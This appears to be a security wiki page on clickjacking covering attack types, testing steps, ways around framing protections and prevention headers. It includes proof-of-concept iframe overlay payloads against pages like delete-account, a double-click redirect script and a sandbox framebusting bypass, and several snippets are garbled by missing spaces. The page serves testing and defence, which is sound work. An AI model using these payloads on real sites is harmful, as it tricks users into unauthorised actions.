---
title: Clickjacking
---

# Clickjacking

Clickjacking (also known as **UI Redressing**) is a client-side web vulnerability where an attacker tricks a victim into interacting with a hidden or disguised UI element from a legitimate website. The attacker places the target application inside an invisible iframe and overlays it with malicious content, causing the victim to unknowingly perform actions.

The attack abuses the trust a user has in a website and the browser's ability to render cross-origin frames. Successful exploitation can lead to unauthorized actions such as changing account settings, enabling features, performing transactions, authorizing OAuth applications, or submitting sensitive actions.

Common impact includes:

- Unauthorized account changes
- Enabling/disabling security settings
- Unauthorized transactions
- OAuth authorization abuse
- Permission granting
- Sensitive action execution

---

# Fundamentals of Clickjacking

## How Clickjacking Works

Clickjacking relies on three main components:

### 1. Target Website

The vulnerable website allows itself to be loaded inside an iframe.

Example:

```
<iframesrc="https://victim.com/change-email"></iframe>
```

---

### 2. Transparent Overlay

The attacker places invisible UI elements above the iframe.

Example:

```
<iframesrc="https://victim.com/delete-account"style="
opacity:0;
position:absolute;
width:100%;
height:100%;"></iframe>
```

The victim thinks they are clicking the attacker's page but actually clicks the hidden iframe.

---

### 3. User Interaction

Clickjacking requires victim interaction.

Examples:

- Clicking a button
- Dragging an object
- Double-clicking
- Approving permissions

---

## Browser Security Concepts

### iframe

An iframe allows embedding another webpage inside the current webpage.

Example:

```
<iframesrc="https://example.com"></iframe>
```

Attackers abuse this behavior to embed sensitive pages.

---

### Same-Origin Policy (SOP)

Browsers prevent scripts from reading cross-origin iframe content.

However:

- SOP prevents reading data
- SOP does NOT prevent framing

Example:

Attacker cannot:

```
iframe.contentWindow.document.body.innerHTML
```

But can still:

```
<iframesrc="https://victim.com"></iframe>
```

This is why clickjacking is possible.

---

## Conditions Required for Clickjacking

A successful clickjacking attack usually requires:

✅ Application can be embedded in iframe

AND

✅ Sensitive action is possible through GET/POST request

AND

✅ No CSRF protection or weak CSRF protection

AND

✅ User interaction required

---

## Types of Clickjacking Attacks

### 1. Basic Clickjacking

Attacker hides a sensitive button.

Example:

Victim sees:

```
Click Here To Win Prize
```

Actual action:

```
Delete Account
```

Payload:

```
<iframe src="https://victim.com/delete-account"style="
opacity:0;
position:absolute;
top:0;
left:0;
width:100%;
height:100%;"></iframe>
```

---

### 2. Likejacking

Used to force users to perform social media actions.

Examples:

- Like a page
- Follow account
- Share content

---

### 3. Login Clickjacking

Attempts to trick users into entering credentials into a fake overlay.

Example:

Attacker page:

```
Enter username/password
```

Hidden iframe:

```
https://victim.com/login
```

However, modern browsers and password managers reduce effectiveness.

---

### 4. Action Clickjacking

Targets sensitive functionality.

Examples:

- Change email
- Change password
- Delete account
- Enable MFA
- Add payment method

Example:

```
<iframesrc="https://victim.com/change-password"></iframe>
```

---

### 5. OAuth Clickjacking

Targets OAuth authorization flows.

Example:

Victim visits:

```
https://attacker.com
```

Hidden iframe:

```
https://oauth-provider.com/authorize
```

Victim unknowingly clicks:

```
Allow Application
```

Result:

Attacker obtains OAuth authorization.

---

### 6. Drag-and-Drop Clickjacking

Uses drag operations instead of clicks.

Example:

Victim drags text/file.

Actual action:

- Upload file
- Transfer information
- Change settings

---

### 7. DoubleClickjacking

A modern variation where two clicks are abused.

Flow:

1. User clicks attacker page.
2. Attacker changes iframe location.
3. Second click performs sensitive action.

Example:

```
window.addEventListener("click",
()=>{setTimeout(()=>{window.location="https://victim.com/action";
},100);
});
```

---

# Attack Surface

Look for:

## Account Management

```
/profile
/settings
/change-email
/change-password
/delete-account
```

---

## Financial Actions

```
/transfer
/payment
/add-card
/withdraw
```

---

## Security Features

```
/enable-mfa
/disable-mfa
/change-security-question
```

---

## OAuth

```
/authorize
/oauth/consent
/connect
```

---

## File Operations

```
/upload
/import
/export
```

---

# Exploitation Techniques

## 1. Basic Detection

Check headers:

```
curl-I https://target.com
```

Look for:

```
X-Frame-Options
Content-Security-Policy
```

---

## 2. Testing iframe Loading

Create:

```
<html><body><h1>Click Here</h1><iframesrc="https://target.com"width="800"height="600"></iframe></body></html>
```

If page loads:

Potential clickjacking.

---

## 3. Transparent Overlay Testing

Example:

```
<style>iframe{
opacity:0.1;
position:absolute;
top:0;
left:0;
width:100%;
height:100%;
}</style><iframesrc="https://target.com"></iframe>
```

Check if sensitive buttons are clickable.

---

# **Bypassing Clickjacking Protections**

## **A. Bypassing X-Frame-Options**

- **Case 1**: **`X-Frame-Options: DENY`** (No bypass, strict)
- **Case 2**: **`X-Frame-Options: SAMEORIGIN`**
    - **Bypass**: Use a same-origin iframe (if attacker controls a subdomain).
- **Case 3**: **`X-Frame-Options: ALLOW-FROM uri`** (Deprecated, rarely used)

## **B. Bypassing CSP frame-ancestors**

- **Case 1**: **`Content-Security-Policy: frame-ancestors 'none'`** (No bypass)
- **Case 2**: **`Content-Security-Policy: frame-ancestors 'self'`**
    - **Bypass**: If misconfigured, use a same-origin iframe.
- **Case 3**: **`Content-Security-Policy: frame-ancestors https://trusted.com`**
    - **Bypass**: If **`trusted.com`** has XSS, load via that domain.

## **C. Bypassing JavaScript Framebusting**

- **Example**: Victim site uses:
    
    ```
    if (top != self) top.location = self.location;
    ```
    
- **Bypass**:
    
    ```
    <iframe src="https://victim-site.com" sandbox="allow-scripts allow-forms"></iframe>
    ```
    
    (Sandboxing prevents framebusting)
    

---

# Framework Specific Considerations

## Django

Protection:

```
X_FRAME_OPTIONS='DENY'
```

---

## Spring Security

Enable:

```
headers().frameOptions().deny();
```

---

## ASP.NET

Add:

```
<addname="X-Frame-Options"value="DENY"/>
```

---

## Express.js

Using Helmet:

```
app.use(helmet.frameguard({
action:'deny'
})
);
```

---

# Testing Methodology

## Manual Testing Checklist

### Step 1

Check headers:

```
curl-I https://target.com
```

---

### Step 2

Verify:

```
X-Frame-Options
Content-Security-Policy
```

---

### Step 3

Create iframe PoC.

---

### Step 4

Test sensitive actions:

- Change email
- Password reset
- Transactions
- OAuth consent

---

### Step 5

Check:

- GET based actions
- CSRF protection
- Authentication requirements

---

# Tools

| Tool | Purpose |
| --- | --- |
| Burp Suite / OWASP ZAP | Header analysis and clickjacking detection |
| Clickjacking Tester | iframe testing |

---

# Impact

Successful clickjacking can result in:

- Unauthorized account modifications
- Account takeover assistance
- Unauthorized financial transactions
- OAuth token theft
- Privacy violations
- Enabling security settings without consent
- User reputation damage
- Abuse of trusted applications

The impact depends on the functionality exposed through the framed page. Critical actions such as password changes, payment approvals, or OAuth authorization can result in severe compromise.

---

# Prevention Techniques

## 1. Implement CSP frame-ancestors

Recommended:

```
Content-Security-Policy:
frame-ancestors 'none';
```

Allow trusted domains:

```
Content-Security-Policy:
frame-ancestors 'self' https://trusted.com;
```

---

## 2. Implement X-Frame-Options

Legacy browser support:

```
X-Frame-Options: DENY
```

or

```
X-Frame-Options: SAMEORIGIN
```

---

## 3. Protect Sensitive Actions

Use:

- CSRF tokens
- Re-authentication
- MFA confirmation
- User confirmation prompts

---

## 4. Avoid Sensitive GET Actions

Bad:

```
GET /delete-account
```

Good:

```
POST /delete-account
```

with CSRF protection.

---

## 5. Use SameSite Cookies

Example:

```
Set-Cookie:
session=value;
SameSite=Lax;
Secure;
HttpOnly
```

---

## 6. Implement User Interaction Confirmation

For critical operations:

- Transaction confirmation
- Password confirmation
- OTP verification

---

# Real-World Examples

**Facebook Likejacking**

Attackers forced users to click hidden Like buttons using transparent iframes.

---

**OAuth Authorization Clickjacking**

Attackers abused OAuth consent screens to trick users into authorizing malicious applications.

---

**Banking Applications**

Targets:

- Fund transfers
- Beneficiary addition
- Account changes

## Good to Read:

[https://hackerone.com/reports/1418857](https://hackerone.com/reports/1418857)

[https://hackerone.com/reports/1416612](https://hackerone.com/reports/1416612)

[https://hackerone.com/reports/1574017](https://hackerone.com/reports/1574017)

---

# References

[https://portswigger.net/web-security/clickjacking](https://portswigger.net/web-security/clickjacking)

[https://owasp.org/www-community/attacks/Clickjacking](https://owasp.org/www-community/attacks/Clickjacking)

[https://medium.com/infosecmatrix/clickjacking-a-comprehensive-guide-to-finding-clickjacking-vulnerabilities-3f51d8e63a41](https://medium.com/infosecmatrix/clickjacking-a-comprehensive-guide-to-finding-clickjacking-vulnerabilities-3f51d8e63a41)

[https://medium.com/@NiaziSec/bug-bounty-hunting-web-vulnerability-clickjacking-a96bbd91a97a](https://medium.com/@NiaziSec/bug-bounty-hunting-web-vulnerability-clickjacking-a96bbd91a97a)

[https://cybertrends-indusface.medium.com/clickjacking-attacks-and-tips-to-prevent-them-82f47acc83d3](https://cybertrends-indusface.medium.com/clickjacking-attacks-and-tips-to-prevent-them-82f47acc83d3)

[https://medium.com/@g52238317/clickjacking-vulnerability-to-trigger-reflacted-xss-9029cc5fd676](https://medium.com/@g52238317/clickjacking-vulnerability-to-trigger-reflacted-xss-9029cc5fd676)